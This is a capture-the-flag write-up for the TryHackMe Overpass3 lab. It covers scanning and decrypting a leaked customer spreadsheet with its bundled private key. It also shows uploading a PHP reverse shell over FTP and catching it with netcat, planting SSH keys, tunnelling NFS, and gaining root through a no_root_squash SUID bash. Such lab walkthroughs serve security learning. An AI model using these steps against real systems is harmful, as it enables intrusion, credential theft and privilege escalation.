## Overpass3 (TryHackMe)

# Scanning 

I started with an aggressive nmap scan to enumerate services. I like to use the command ```nmap -A [Remote IP]```.
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.64 seconds
```
I also wanted to make sure I hit all the services. So I did a full port scan as well. 
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 216.88 seconds
```
I attempted to use anonymous FTP to login but I was unsuccessful. 
```
Password:
530 Login incorrect.
Login failed.
```

# Enumeration 

I want to take a deeper look at the http service. So, I am going to run Nikto with the ```-h``` option and gobuster with the ```SecLists/Discovery/Web-Content/directory-list-1.0.txt```. 

Nikto did not return much useful information.
```
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos)
+ Server leaks inodes via ETags, header found with file /, fields: 0x6ea 0x5b4538a1d1400 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-02-18 10:13:55 (GMT-5) (715 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
However, gobuster produced an interesting directory locations.
```
=====================================================
2022/02/18 10:02:30 Starting gobuster
=====================================================
/backups (Status: 301)
=====================================================
2022/02/18 10:26:57 Finished
=====================================================
```
Navigating to the /backups directory, there is a backups.zip file available for download. I downloaded the file and unzipped. 
```
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg  
  inflating: priv.key 
```
It looks like the file contains an excel sheet of Customer details. However, it is encrypted with Gnu Privacy Guard (```https://gnupg.org/```). Luckily, the private key for decryption is included in the zip file. Therefore, all I need to do is decrypt with ```priv.key```. In order to do so, I need to import the private key into gpg and then ask for the file to be decrypted. 

The first command is to import the private key. 
```
gpg --import ~/Downloads/priv.key

gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```
The second command is to decrypt the file. 
```
gpg --output ~/TryHackMe/practice/CustomerDetails.xlsx --decrypt ~/Downloads/CustomerDetails.xlsx.gpg

gpg 
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"

```
The decrypted excel file has 3 entries with customer name, username, password, credit card number and CVC. 

With the credentials for paradox, I logged in as the user to the FTP service. It appears taht I landed in the directory hosting the website. 
```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
226 Directory send OK.

```

# Initial Access

With the knowledge of the ability to upload files via FTP, I created a reverse shell using pentest monkey's php reverse shell (```https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php```) setting the correct IP and changing the port to 9999. Then, I placed the reverse shell in the directory that I landed in with FTP. 
```
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (62.3521 MB/s)
```
I opened up a netcat listener on port 9999.  
```
nc -lnvp 9999
```
Then, I ran a curl command to call the php reverse shell which I caught with the netcat listener above. 
```
curl http://[Remote IP]/php-reverse-shell.php
```
Now, I have a shell as user apache!
```
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (875): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ 
```
I wanted to change the shell to bash and possibly upgrade the shell.
```
sh-4.4$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-4.4$
```
Now that I am logged in as user apache, I can find the web flag. 
```
bash-4.4$ ls
ls
error  icons  noindex  web.flag
```
I uploaded LinPeas.sh (```https://github.com/carlospolop/PEASS-ng/releases/tag/20220214```) to do further enumeration on the remote machine and to get ideas for privilege escalation. I uploaded linpeas using FTP like I did with the PHP reverse shell. In order to execute linpeas, I had to navigate to ```/var/www/html``` and I needed to login as paradox user (since before I was only apache user when I dropped into the reverse shell).
```
bash-4.4$ su paradox
su paradox
Password: [REDACTED]
```
Now that I am user paradox, I can set the correct permissions for linpeas to execute within the terminal. Linpeas produces a lot of output. However, it looks like NFS is vulnerable. To check out the rpc options, I run ```rpcinfo -p``` to find the below. 
```
rpcinfo -p
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100024    1   udp  37961  status
    100024    1   tcp  49915  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  49585  nlockmgr
    100021    3   udp  49585  nlockmgr
    100021    4   udp  49585  nlockmgr
    100021    1   tcp  40111  nlockmgr
    100021    3   tcp  40111  nlockmgr
    100021    4   tcp  40111  nlockmgr
```
It looks like NFS is vulnerable to privilege escalation through a misconfiguration (https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe). My best option is to try to connect to one of the nfs at port 2049. But, I am not able to do so remotely. I need to forward an NFS connection over to my remote/attacker machine via ssh. It is eaiser since I already have a user (paradox) on the victim machine. 

First, I will create a similar paradox user on my local/attack machine and copy the key over so that it is authorized to login via ssh. 
```
ssh-keygen -f paradox
```
I also need to add the paradox ssh key to the authorized hosts on the remote/victim machine. 
```
echo "ssh-rsa [KEY]" > .ssh/authorized_keys
```
With the paradox public key in authorized keys and the private key for paradox, I am able to ssh into the machine using port forwarding on port 2049 on both my attack machine and the victim machine. I needed to use port 2049 because I want to set up an NFS on my localhost at the appropriate port. Therefore, I want to forward any connection on port 2049 to port 2049 on my local machine over ssh. Once connected, it will give me a shell with ssh. 
```
ssh paradox@[Remote IP] -i paradox -L 2049:localhost:2049
```
Now, I created a mnt directory in my attack machine so that I can mount the NFS from the victim. I used the mount command to connect the two.  
```
sudo mount -v -t nfs localhost:/ ./mnt/
```
Finally, I went to the mnt directory in my local machine and found the user flag. The mnt directory on my attack machine is really the home directory of paradox user now. 
```
ajread@aj-ubuntu:~/TryHackMe/practice/mnt$ ls
user.flag
```

# Privilege Escalation 

I know that james is another user on the machine. So, I did the same steps with james as a did with paradox, setting up a ssh key on my attack box with ```ssh-keygen -f james```, adding it to authorized keys and authenticating with the private key. However, this time I used my mounted NFS to upload the james private key and update to authorized keys. Therefore, authorized keys was located at ```/mnt/.ssh/authorized_keys``` on my local machine and the same goes for the private keys found at ```/mnt/.ssh/id_rsa```. 

After those steps were complete, I was able to ssh into the box from my attack machine. 
```
ssh -i james james@10.10.252.23
```
With my mounted connection to the victim, I copied the version ```/bin/bash``` on the victim/target machine to the current working directory on the victim/target machine. This gives me the ability to edit the permissions of bash. 
```
cp /bin/bash .
```
On my attack machine, I took ownership of the copied bash above as root and set privileges with the SUID bit. 
```
/home/ajread/TryHackMe/practice/mnt# chown root:root bash
/home/ajread/TryHackMe/practice/mnt# chmod +s bash
```
Now, the permissions for the copied bash within the home directory of james allow him to execute it as root. With that done, user james is able to execute ```[james@ip-10-10-121-43 ~]$ ./bash -p``` and become root! 
```
bash-4.4# wc -c root.flag 
38 root.flag
```